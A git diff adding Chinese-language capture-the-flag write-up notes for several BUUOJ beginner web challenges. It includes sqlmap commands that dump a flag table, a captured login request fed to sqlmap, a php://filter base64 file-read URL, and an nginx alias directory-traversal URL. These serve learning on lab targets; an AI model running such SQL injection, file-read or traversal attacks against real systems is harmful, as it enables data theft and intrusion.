@@ -28,3 +28,43 @@ git show 213b7e386e9b0b406d91fae58bf8be11a58c3f88
 ```sh
 python .\sqlmap.py -u http://54313594-3a8c-4a9f-afdf-1c4c3a6d32a9.node5.buuoj.cn:81/index.php?id=1 --threads 10 -D note -T fl4g -C fllllag --dump
 ```
+
+# [第一章 web入门]SQL注入-2
+看提示抓包得到 payload: `sqlmap.txt`
+```
+POST /login.php HTTP/1.1
+Host: 5bbca68c-c344-483c-b720-72fc1e93e32a.node5.buuoj.cn:81
+Content-Length: 28
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0
+Accept: application/json, text/javascript, */*; q=0.01
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://5bbca68c-c344-483c-b720-72fc1e93e32a.node5.buuoj.cn:81
+Referer: http://5bbca68c-c344-483c-b720-72fc1e93e32a.node5.buuoj.cn:81/login.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Connection: keep-alive
+
+name=admin&pass=aaaaaaaaaaaa
+```
+使用 sqlmap 得到结果。
+```sh
+python .\sqlmap.py -r ..\..\assets\sqlmap.txt -D note -T fl4g -C flag --dump
+```
+
+# [第一章 web入门]afr_1
+看答案说要用以下方法构造 url，不知道为啥：
+```
+http://c127db16-ec54-4b5a-a090-07204c94bcea.node5.buuoj.cn:81/?p=php://filter/read=convert.base64-encode/resource=flag
+```
+将返回的结果用 base64 解码：
+```
+PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9
+```
+
+# [第一章 web入门]afr_2
+查看图片地址为
+`http://1fcf9b71-f01a-43c6-9360-f067b8b26674.node5.buuoj.cn/img/img.gif`
+然后答案说 nginx 没有在配置 static 文件夹的时候，忘记在最后面加上/，导致访问/static../的时候，会被替换为path/to/static/../，从而导致目录穿越漏洞。
+所以这里可以尝试 `http://1fcf9b71-f01a-43c6-9360-f067b8b26674.node5.buuoj.cn/img../`
+然后就能得到 flag 文件
